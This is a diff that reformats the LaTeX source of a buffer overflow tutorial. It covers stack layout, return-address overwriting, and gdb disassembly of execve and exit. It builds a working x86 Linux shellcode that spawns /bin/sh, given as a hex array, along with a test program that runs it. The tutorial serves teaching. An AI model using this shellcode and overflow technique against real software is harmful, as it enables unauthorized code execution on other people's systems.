@@ -237,6 +237,7 @@ bytes, or 32 bits.  So our 5 byte buffer is really going to take 8 bytes (2 word
 buffer is going to take 12 bytes (3 words) of memory.  That is why SP is being subtracted by 20.  With that in 
 mind our stack looks like this when function() is called  (each space represents a byte):
 
+{\small
 \begin{verbatim}
 bottom of                                    top of
 memory                                       memory
@@ -246,7 +247,7 @@ memory                                       memory
 top of                                       bottom of
 stack                                        stack
 \end{verbatim}
-
+}
 \section{Buffer Overflows}
 
 A buffer overflow is the result of stuffing more data into a buffer than it can handle. How can this often found 
@@ -276,6 +277,7 @@ void main()
 This program has a function with a typical buffer overflow coding error. The function copies a supplied string 
 without bounds checking by using strcpy() instead of strncpy(). If you run this program you will get a segmentation violation. Lets see what its stack looks [like] when we call function: 
 
+{\small
 \begin{verbatim}
 bottom of                                    top of
 memory                                       memory
@@ -285,7 +287,7 @@ memory                                       memory
 top of                                       bottom of
 stack                                        stack
 \end{verbatim}
-
+}
 What is going on here? Why do we get a segmentation violation? Simple. strcpy() is copying the contents of  
 \verb+*str (larger_string[])+ into buffer[] until a null character  is found on the string. As we can see buffer[] is much 
 smaller than *str. buffer[] is 16 bytes long, and we are trying to stuff it with 256 bytes. This means t hat all 250 
@@ -296,6 +298,7 @@ and tries to read the next instruction from that address you get a segmentation 
 allows us to change the return address of a function. In this way we can change the flow of execution of the 
 program. Lets go back to our first example and recall what the stack looked like: 
 
+{\small
 \begin{verbatim}
 bottom of                                   top of
 memory                                      memory
@@ -304,7 +307,7 @@ memory                                      memory
 top of                                      bottom of
 stack                                       stack
 \end{verbatim}
-
+}
 Lets try to modify our first example so that it overwrites the return address, and demonstrate how we can make 
 it execute arbitrary code. Just before buffer1[] on the stack is SFP, and before it, the return address. That is 4 
 bytes pass the end of buff er1[]. But remember that buffer1[] is real ly 2 word so its 8 bytes long. So the return 
@@ -340,17 +343,21 @@ want to skip past the assignment to the printf call. How did we know to add 8 [s
 
 address? We used a test value first (for example 1), compiled the program, and  then started gdb:
 
-\begin{lstlisting}
+{\small
+\begin{verbatim}
 [aleph1]$ gdb example3
-\end{lstlisting}
 
+GDB is free software and you are welcome to distribute 
+copies of it under certain conditions; type 
+"show copying" to see the conditions.  There is 
+absolutely no warranty for GDB; type "show warranty" 
+for details.
 
-\begin{lstlisting}
-GDB is free software and you are welcome to distribute copies of it
- under certain conditions; type "show copying" to see the conditions.
-There is absolutely no warranty for GDB; type "show warranty" for details.
-GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+GDB 4.15 (i586-unknown-linux), Copyright 1995 
+Free Software Foundation, Inc...
+
 (no debugging symbols found)...
+
 (gdb) disassemble main
 Dump of assembler code for function main:
 0x8000490 :    pushl  %ebp
@@ -372,7 +379,8 @@ Dump of assembler code for function main:
 0x80004c5 :    popl   %ebp
 0x80004c6 :    ret
 0x80004c7 :    nop
-\end{lstlisting}
+\end{verbatim}
+}
 
 We can see that when calling function() the RET wil l be 0x8004a8, and we want to jump past the assignment at 
 0x80004ab. The next instruction we want to execute is the at 0x8004b2. A little math tells us the distance is 8 
@@ -388,17 +396,18 @@ execute in the buffer we are overflowing, and overwrite the return address so it
 Assuming the stack starts at address 0xFF, and that S stands for the code we want to execute the stack would 
 then look like this:
 
+{\scriptsize
 \begin{verbatim}
-bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
-memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory           
+bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF top of
+memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF memory           
            buffer                sfp   ret   a     b     c
 <------   [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]
            ^                            |
            |____________________________|
-top of                                                            bottom of
-stack                                                                 stack
+top of                                                      bottom of
+stack                                                       stack
 \end{verbatim}
-
+}
   
 
 The code to spawn a shell in C looks like:
@@ -421,77 +430,84 @@ To find out what it l ooks like in assembly we compile it, and start up gdb. Rem
 Otherwise the actual code  for the execve system call wil l not be included. Instead there wil l be a reference to 
 dynamic C library that would normally would be linked in at load time. 
 
-\begin{lstlisting}
+{\small
+\begin{verbatim}
 [aleph1]$ gcc -o shellcode -ggdb -static shellcode.c
 [aleph1]$ gdb shellcode
 
-GDB is free software and you are welcome to distribute copies of it
- under certain conditions; type "show copying" to see the conditions.
-There is absolutely no warranty for GDB; type "show warranty" for details.
-GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+GDB is free software and you are welcome to 
+distribute copies of it under certain 
+conditions; type "show copying" to see 
+the conditions.  There is absolutely no 
+warranty for GDB; type "show warranty" 
+for details.
+
+GDB 4.15 (i586-unknown-linux), Copyright 1995 
+Free Software Foundation, Inc...
 
 (gdb) disassemble main
 Dump of assembler code for function main:
 
-0x8000130 :    pushl  %ebp
-0x8000131 :    movl   %esp,%ebp
-0x8000133 :    subl   $0x8,%esp
-0x8000136 :    movl   $0x80027b8,0xfffffff8(%ebp)
-0x800013d :    movl   $0x0,0xfffffffc(%ebp)
-0x8000144 :    pushl  $0x0
-0x8000146 :    leal   0xfffffff8(%ebp),%eax
-0x8000149 :    pushl  %eax
-0x800014a :    movl   0xfffffff8(%ebp),%eax
-0x800014d :    pushl  %eax
-0x800014e :    call   0x80002bc <__execve>
-0x8000153 :    addl   $0xc,%esp
-0x8000156 :    movl   %ebp,%esp
-0x8000158 :    popl   %ebp
-0x8000159 :    ret
+0x8000130: pushl %ebp
+0x8000131: movl  %esp,%ebp
+0x8000133: subl  $0x8,%esp
+0x8000136: movl  $0x80027b8,0xfffffff8(%ebp)
+0x800013d: movl  $0x0,0xfffffffc(%ebp)
+0x8000144: pushl $0x0
+0x8000146: leal  0xfffffff8(%ebp),%eax
+0x8000149: pushl %eax
+0x800014a: movl  0xfffffff8(%ebp),%eax
+0x800014d: pushl %eax
+0x800014e: call  0x80002bc <__execve>
+0x8000153: addl  $0xc,%esp
+0x8000156: movl  %ebp,%esp
+0x8000158: popl  %ebp
+0x8000159: ret
 End of assembler dump.
 
 (gdb) disassemble __execve
 Dump of assembler code for function __execve:
-0x80002bc <__execve>:           pushl  %ebp
-0x80002bd <__execve+1>:         movl   %esp,%ebp
-0x80002bf <__execve+3>:         pushl  %ebx
-0x80002c0 <__execve+4>:         movl   $0xb,%eax
-0x80002c5 <__execve+9>:         movl   0x8(%ebp),%ebx
-0x80002c8 <__execve+12>:        movl   0xc(%ebp),%ecx
-0x80002cb <__execve+15>:        movl   0x10(%ebp),%edx
-0x80002ce <__execve+18>:        int    $0x80
-0x80002d0 <__execve+20>:        movl   %eax,%edx
-0x80002d2 <__execve+22>:        testl  %edx,%edx
-0x80002d4 <__execve+24>:        jnl    0x80002e6 <__execve+42>
-0x80002d6 <__execve+26>:        negl   %edx
-0x80002d8 <__execve+28>:        pushl  %edx
-0x80002d9 <__execve+29>:        call   0x8001a34 <__normal_errno_location>
-0x80002de <__execve+34>:        popl   %edx
-0x80002df <__execve+35>:        movl   %edx,(%eax)
-0x80002e1 <__execve+37>:        movl   $0xffffffff,%eax
-0x80002e6 <__execve+42>:        popl   %ebx
-0x80002e7 <__execve+43>:        movl   %ebp,%esp
-0x80002e9 <__execve+45>:        popl   %ebp
-0x80002ea <__execve+46>:        ret
-0x80002eb <__execve+47>:        nop
+0x80002bc <__execve>:   pushl  %ebp
+0x80002bd <__execve+1>: movl   %esp,%ebp
+0x80002bf <__execve+3>: pushl  %ebx
+0x80002c0 <__execve+4>: movl   $0xb,%eax
+0x80002c5 <__execve+9>: movl   0x8(%ebp),%ebx
+0x80002c8 <__execve+12>:movl   0xc(%ebp),%ecx
+0x80002cb <__execve+15>:movl   0x10(%ebp),%edx
+0x80002ce <__execve+18>:int    $0x80
+0x80002d0 <__execve+20>:movl   %eax,%edx
+0x80002d2 <__execve+22>:testl  %edx,%edx
+0x80002d4 <__execve+24>:jnl    0x80002e6 <__execve+42>
+0x80002d6 <__execve+26>:negl   %edx
+0x80002d8 <__execve+28>:pushl  %edx
+0x80002d9 <__execve+29>:
+            call   0x8001a34 <__normal_errno_location>
+0x80002de <__execve+34>:popl   %edx
+0x80002df <__execve+35>:movl   %edx,(%eax)
+0x80002e1 <__execve+37>:movl   $0xffffffff,%eax
+0x80002e6 <__execve+42>:popl   %ebx
+0x80002e7 <__execve+43>:movl   %ebp,%esp
+0x80002e9 <__execve+45>:popl   %ebp
+0x80002ea <__execve+46>:ret
+0x80002eb <__execve+47>:nop
 End of assembler dump.
-\end{lstlisting}
+\end{verbatim}
 
 Lets try to understand what is going on here.  We'll start by studying main: 
 
-\begin{lstlisting}
+\begin{verbatim}
 0x8000130 : pushl %ebp
 0x8000131 : movl %esp,%ebp
 0x8000133 : subl $0x8,%esp
-\end{lstlisting}
+\end{verbatim}
 
 This is the procedure pre lude. It first saves the old frame pointer, makes the current stack pointer the new frame 
 pointer, and leaves space for the local variables. In this case its: char *name[2]; or 2 pointers to a char. Pointers 
 are a word long, so it lea ves space for two words (8 bytes).
 
-\begin{lstlisting}
+\begin{verbatim}
 0x8000136 : movl $0x80027b8,0xfffffff8(%ebp)
-\end{lstlisting}
+\end{verbatim}
 
 We copy the value 0x80027b8 (the address of the string "/bin/sh") into the first pointer of name[]. This is 
 equivalent to: 
@@ -500,16 +516,16 @@ equivalent to:
 name[0] = "/bin/sh";
 \end{verbatim}
 
-\begin{lstlisting}
+\begin{verbatim}
 0x800013d : movl $0x0,0xfffffffc(%ebp)
-\end{lstlisting}
+\end{verbatim}
 
 We copy the value 0x0 (NULL) in to the seconds pointer of name[].  This is equivalent to: name[1] = NULL; 
 The actual call to execve() starts here.
 
-\begin{lstlisting}
+\begin{verbatim}
 0x8000144 : pushl $0x0
-\end{lstlisting}
+\end{verbatim}
 
 We push the arguments to execve() in reverse order onto the stack. We start with NULL.
 
@@ -522,46 +538,35 @@ We load the address of name[] into the EAX register.
 0x8000149 : pushl %eax 
 \end{verbatim}
 We push the address of name[]  onto the stack.
-
 \begin{verbatim}
 0x800014a : movl 0xfffffff8(%ebp),%eax
 \end{verbatim}
-
 We load the address of the string "/bin/sh" into the EAX register.
-
 \begin{verbatim}
 0x800014d : pushl %eax 
 \end{verbatim}
-
 We push the address of the string "/bin/sh" onto the stack.
-
-\begin{lstlisting}
+\begin{verbatim}
 0x800014e : call 0x80002bc <__execve>
-\end{lstlisting}
-
+\end{verbatim}
 Call the library procedure execve(). The call instruction pushes the IP onto the stack.
-
 Now execve(). Keep in mind we are using a Intel based Linux system. The syscall details will change from OS 
-
 to OS, and from CPU to CPU. Some will pass the arguments on the stack, others on the registers. Some use a 
-
 software interrupt to jump to kernel mode, others use a far call. Linux passes its arguments to the system call on 
-
 the registers, and uses a software interrupt to jump into kernel mode.
 
-\begin{lstlisting}
+\begin{verbatim}
 0x80002bc <__execve>:   pushl  %ebp
 0x80002bd <__execve+1>: movl   %esp,%ebp
 0x80002bf <__execve+3>: pushl  %ebx
-\end{lstlisting}
-
+\end{verbatim}
 The procedure prelude. 
-
 \begin{verbatim}
 0x80002c0 <__execve+4>: movl   $0xb,%eax
 Copy 0xb (11 decimal) onto the stack. 
 This is the index into the syscall table. 
 11 is execve. 
+
 0x80002c5 <__execve+9>: movl   0x8(%ebp),%ebx
 Copy the address of "/bin/sh" into EBX. 
 0x80002c8 <__execve+12>:   movl   0xc(%ebp),%ecx
@@ -570,10 +575,8 @@ Copy the address of name[] into ECX.
 Copy the address of the null pointer into %edx. 
 0x80002ce <__execve+18>:   int    $0x80
 \end{verbatim}
-
 Change into kernel mode. [Trap into the kernel.] 
 As we can see there is not much to the execve() system call. All we need to do is: 
-
 \begin{enumerate}
 \item Have the null terminated string "/bin/sh" somewhere in memory. 
 \item Have the address of the string "/bin/sh" somewhere in memory followed by a null long word. 
@@ -601,34 +604,40 @@ void main()
 }
 \end{lstlisting}
 
+{\small
 \begin{verbatim}
 [aleph1]$ gcc -o exit -static exit.c
 
 [aleph1]$ gdb exit
-GDB is free software and you are welcome to distribute copies of it
- under certain conditions; type "show copying" to see the conditions.
-There is absolutely no warranty for GDB; type "show warranty" for details.
-GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+GDB is free software and you are welcome to distribute 
+copies of it under certain conditions; type 
+"show copying" to see the conditions.  There is 
+absolutely no warranty for GDB; type "show warranty" 
+for details.
+
+GDB 4.15 (i586-unknown-linux), Copyright 1995 
+Free Software Foundation, Inc...
+
 (no debugging symbols found)...
 
 (gdb) disassemble _exit
 Dump of assembler code for function _exit:
-0x800034c <_exit>:      pushl  %ebp
-0x800034d <_exit+1>:    movl   %esp,%ebp
-0x800034f <_exit+3>:    pushl  %ebx
-0x8000350 <_exit+4>:    movl   $0x1,%eax
-0x8000355 <_exit+9>:    movl   0x8(%ebp),%ebx
-0x8000358 <_exit+12>:   int    $0x80
-0x800035a <_exit+14>:   movl   0xfffffffc(%ebp),%ebx
-0x800035d <_exit+17>:   movl   %ebp,%esp
-0x800035f <_exit+19>:   popl   %ebp
-0x8000360 <_exit+20>:   ret
-0x8000361 <_exit+21>:   nop
-0x8000362 <_exit+22>:   nop
-0x8000363 <_exit+23>:   nop
+0x800034c <_exit>:   pushl  %ebp
+0x800034d <_exit+1>: movl   %esp,%ebp
+0x800034f <_exit+3>: pushl  %ebx
+0x8000350 <_exit+4>: movl   $0x1,%eax
+0x8000355 <_exit+9>: movl   0x8(%ebp),%ebx
+0x8000358 <_exit+12>:int    $0x80
+0x800035a <_exit+14>:movl   0xfffffffc(%ebp),%ebx
+0x800035d <_exit+17>:movl   %ebp,%esp
+0x800035f <_exit+19>:popl   %ebp
+0x8000360 <_exit+20>:ret
+0x8000361 <_exit+21>:nop
+0x8000362 <_exit+22>:nop
+0x8000363 <_exit+23>:nop
 End of assembler dump.
 \end{verbatim}
-
+}
 The exit syscall will place 0x1 in EAX, place the exit code in EBX, and execute "int 0x80". That's it. Most 
 applications return 0 on exit to indicate no errors. We will place 0 in EBX.  Our list of steps is now: 
 
@@ -643,300 +652,205 @@ applications return 0 on exit to indicate no errors. We will place 0 in EBX.  Ou
 \item Copy 0x0 into the EBX register. 
 \item Execute the int \$0x80 instruction. 
 \end{enumerate}
-\begin{comment}
 
 Trying to put this together in assembly language, placing the string after the code, and remembering we will 
-
 place the address of the string, and nul l word after the array, we have:
 
-        movl   string_addr,string_addr_addr
-
-        movb   $0x0,null_byte_addr
-
-        movl   $0x0,null_addr
-
-        movl   $0xb,%eax
-
-        movl   string_addr,%ebx
-
-        leal   string_addr,%ecx
-
-        leal   null_string,%edx
-
-        int    $0x80
-
-        movl   $0x1, %eax
-
-        movl   $0x0, %ebx
-
-        int    $0x80
-
-        /bin/sh string goes here.
+\begin{verbatim}
+movl   string_addr,string_addr_addr
+movb   $0x0,null_byte_addr
+movl   $0x0,null_addr
+movl   $0xb,%eax
+movl   string_addr,%ebx
+leal   string_addr,%ecx
+leal   null_string,%edx
+int    $0x80
+movl   $0x1, %eax
+movl   $0x0, %ebx
+int    $0x80
+\end{verbatim}
+/bin/sh string goes here.
 
 The problem is that we don't know where in the memory space of the program we are trying to exploit the code 
-
 (and the string that follows it) will be placed. One way around it is to use a JMP, and a CALL instruction. The 
-
 JMP and CALL instructions can use IP relative addressing, which means we can jump to an offset from the 
-
 current IP without needing to know the exact address of where  in memory we want to jump to. If we place a 
-
 CALL instruction right before the "/bin/sh" string, and a JMP instruction to it, the strings address will be 
-
 pushed onto the stack as the return address when CALL is executed. All we need then is to copy the return 
-
 address into a register. The CALL instruction can simply call the start of our code above. Assuming now that J 
-
 stands for the JMP instruction, C for the CALL instruction, and s for the string, the execution flow would now 
-
 be: 
 
+{\tiny
+%{\small
+%{\scriptsize
+\begin{verbatim}
         bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
-
         memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
-
                    buffer                sfp   ret   a     b     c
-
         <------   [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]
-
                    ^|^             ^|            |
-
                    |||_____________||____________| (1)
-
                (2)  ||_____________||
-
                      |______________| (3)
-
 top of                                                            bottom of
-
 stack                                                                 stack
+\end{verbatim}
+}
 
 [There are not enough small s in the figure; strlen("/bin/sh") == 7.] With this modifications, using indexed addressing, and writing down how many bytes each instruction takes our code looks like: 
 
-        jmp    offset-to-call           # 2 bytes
-
-        popl   %esi                     # 1 byte
-
-        movl   %esi,array-offset(%esi)  # 3 bytes
-
-        movb   $0x0,nullbyteoffset(%esi)# 4 bytes
-
-        movl   $0x0,null-offset(%esi)   # 7 bytes
-
-        movl   $0xb,%eax                # 5 bytes
-
-        movl   %esi,%ebx                # 2 bytes
-
-        leal   array-offset(%esi),%ecx # 3 bytes
-
-        leal   null-offset(%esi),%edx   # 3 bytes
-
-        int    $0x80                    # 2 bytes
-
-        movl   $0x1, %eax               # 5 bytes
-
-        movl   $0x0, %ebx               # 5 bytes
-
-        int    $0x80                    # 2 bytes
-
-        call   offset-to-popl           # 5 bytes
-
-        /bin/sh string goes here.
+\begin{verbatim}
+jmp    offset-to-call           # 2 bytes
+popl   %esi                     # 1 byte
+movl   %esi,array-offset(%esi)  # 3 bytes
+movb   $0x0,nullbyteoffset(%esi)# 4 bytes
+movl   $0x0,null-offset(%esi)   # 7 bytes
+movl   $0xb,%eax                # 5 bytes
+movl   %esi,%ebx                # 2 bytes
+leal   array-offset(%esi),%ecx # 3 bytes
+leal   null-offset(%esi),%edx   # 3 bytes
+int    $0x80                    # 2 bytes
+movl   $0x1, %eax               # 5 bytes
+movl   $0x0, %ebx               # 5 bytes
+int    $0x80                    # 2 bytes
+call   offset-to-popl           # 5 bytes
+\end{verbatim}
+/bin/sh string goes here.
 
 Calculating the offsets from jmp to call, from call to popl, from the string address to the array, and from the 
-
 string address to the null long word, we now have: 
 
-        jmp    0x26                     # 2 bytes
 
-        popl   %esi                     # 1 byte
-
-        movl   %esi,0x8(%esi)           # 3 bytes
-
-        movb   $0x0,0x7(%esi)           # 4 bytes
-
-        movl   $0x0,0xc(%esi)           # 7 bytes
-
-        movl   $0xb,%eax                # 5 bytes
-
-        movl   %esi,%ebx                # 2 bytes
-
-        leal   0x8(%esi),%ecx           # 3 bytes
-
-        leal   0xc(%esi),%edx           # 3 bytes
-
-        int    $0x80                    # 2 bytes
-
-        movl   $0x1, %eax               # 5 bytes
-
-        movl   $0x0, %ebx               # 5 bytes
-
-        int    $0x80                    # 2 bytes
-
-        call   -0x2b                    # 5 bytes
-
-        .string \"/bin/sh\"             # 8 bytes
+\begin{verbatim}
+jmp    0x26                     # 2 bytes
+popl   %esi                     # 1 byte
+movl   %esi,0x8(%esi)           # 3 bytes
+movb   $0x0,0x7(%esi)           # 4 bytes
+movl   $0x0,0xc(%esi)           # 7 bytes
+movl   $0xb,%eax                # 5 bytes
+movl   %esi,%ebx                # 2 bytes
+leal   0x8(%esi),%ecx           # 3 bytes
+leal   0xc(%esi),%edx           # 3 bytes
+int    $0x80                    # 2 bytes
+movl   $0x1, %eax               # 5 bytes
+movl   $0x0, %ebx               # 5 bytes
+int    $0x80                    # 2 bytes
+call   -0x2b                    # 5 bytes
+.string \"/bin/sh\"             # 8 bytes
+\end{verbatim}
 
 Looks good. To make sure it works correctly we must compile it and run it. But  there is a problem. Our code 
-
 modifies itself  [where?],  but most operating system mark code pages read only. To get around this restriction 
-
 we must place the code we wish to execute in the stack or data segment, and transfer control to it. To do so we 
-
 will place our code in a global array in the data segment. We need first a hex representation of the binary code. 
-
 Lets compile it first, and then use gdb to obtain it.
 
-shellcodeasm.c 
-
-void main() {
-
+\begin{lstlisting}[caption=shellcodeasm.c]
+void main() 
+{
 __asm__("
-
-        jmp    0x2a                     # 3 bytes
-
-        popl   %esi                     # 1 byte
-
-        movl   %esi,0x8(%esi)           # 3 bytes
-
-        movb   $0x0,0x7(%esi)           # 4 bytes        movl   $0x0,0xc(%esi)           # 7 bytes
-
-        movl   $0xb,%eax                # 5 bytes
-
-        movl   %esi,%ebx                # 2 bytes
-
-        leal   0x8(%esi),%ecx           # 3 bytes
-
-        leal   0xc(%esi),%edx           # 3 bytes
-
-        int    $0x80                    # 2 bytes
-
-        movl   $0x1, %eax               # 5 bytes
-
-        movl   $0x0, %ebx               # 5 bytes
-
-        int    $0x80                    # 2 bytes
-
-        call   -0x2f                    # 5 bytes
-
-        .string \"/bin/sh\"             # 8 bytes
-
+jmp    0x2a                     # 3 bytes
+popl   %esi                     # 1 byte
+movl   %esi,0x8(%esi)           # 3 bytes
+movb   $0x0,0x7(%esi)           # 4 bytes        
+movl   $0x0,0xc(%esi)           # 7 bytes
+movl   $0xb,%eax                # 5 bytes
+movl   %esi,%ebx                # 2 bytes
+leal   0x8(%esi),%ecx           # 3 bytes
+leal   0xc(%esi),%edx           # 3 bytes
+int    $0x80                    # 2 bytes
+movl   $0x1, %eax               # 5 bytes
+movl   $0x0, %ebx               # 5 bytes
+int    $0x80                    # 2 bytes
+call   -0x2f                    # 5 bytes
+.string \"/bin/sh\"             # 8 bytes
 ");
-
 }
+\end{lstlisting}
 
+{\small
+\begin{verbatim}
 [aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c
-
 [aleph1]$ gdb shellcodeasm
 
-GDB is free software and you are welcome to distribute copies of it
+GDB is free software and you are welcome to distribute 
+copies of it under certain conditions; type 
+"show copying" to see the conditions.
 
- under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type 
+"show warranty" for details.  
 
-There is absolutely no warranty for GDB; type "show warranty" for details.
-
-GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+GDB 4.15 (i586-unknown-linux), Copyright 1995 
+Free Software Foundation, Inc...
 
 (gdb) disassemble main
-
 Dump of assembler code for function main:
-
 0x8000130 :    pushl  %ebp
-
 0x8000131 :    movl   %esp,%ebp
-
 0x8000133 :    jmp    0x800015f 
-
 0x8000135 :    popl   %esi
-
 0x8000136 :    movl   %esi,0x8(%esi)
-
 0x8000139 :    movb   $0x0,0x7(%esi)
-
 0x800013d :    movl   $0x0,0xc(%esi)
-
 0x8000144 :    movl   $0xb,%eax
-
 0x8000149 :    movl   %esi,%ebx
-
 0x800014b :    leal   0x8(%esi),%ecx
-
 0x800014e :    leal   0xc(%esi),%edx
-
 0x8000151 :    int    $0x80
-
 0x8000153 :    movl   $0x1,%eax
-
 0x8000158 :    movl   $0x0,%ebx
-
 0x800015d :    int    $0x80
-
 0x800015f :    call   0x8000135 
-
 0x8000164 :    das
-
 0x8000165 :    boundl 0x6e(%ecx),%ebp
-
 0x8000168 :    das
-
 0x8000169 :    jae    0x80001d3 <__new_exitfn+55>
-
 0x800016b :    addb   %cl,0x55c35dec(%ecx)
-
 End of assembler dump.
 
 (gdb) x/bx main+3
-
 0x8000133 :     0xeb
 
 (gdb)
-
 0x8000134 :     0x2a
 
 (gdb)
-
 .
-
 .
-
 .
+\end{verbatim}
+}
 
+\begin{lstlisting}[basicstyle=\tiny]
 testsc.cchar shellcode[] =
+"\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
+"\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+"\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
+"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
 
-        "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
-
-        "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
-
-        "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
-
-        "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
-
-void main() {
-
+void main() 
+{
    int *ret;
-
    ret = (int *)&ret + 2;
 
    (*ret) = (int)shellcode;
-
 }
+\end{lstlisting}
 
+\begin{verbatim}
 [aleph1]$ gcc -o testsc testsc.c
-
 [aleph1]$ ./testsc
-
 $ exit
-
 [aleph1]$
+\end{verbatim}
 
 It works! But there is an obstacle. In most cases we'll be trying to overflow a character buffer. As such any null 
-
 bytes in our shellcode will be considered the end of the string, and the copy will be terminated. There must 
-
 be no null bytes in the shellcode for the exploit to work. Let's try to eliminate the bytes (and at the same 
-
 time make it smaller).
 
+\begin{comment}
            Problem instruction:                 Substitute with:
 
            --------------------------------------------------------
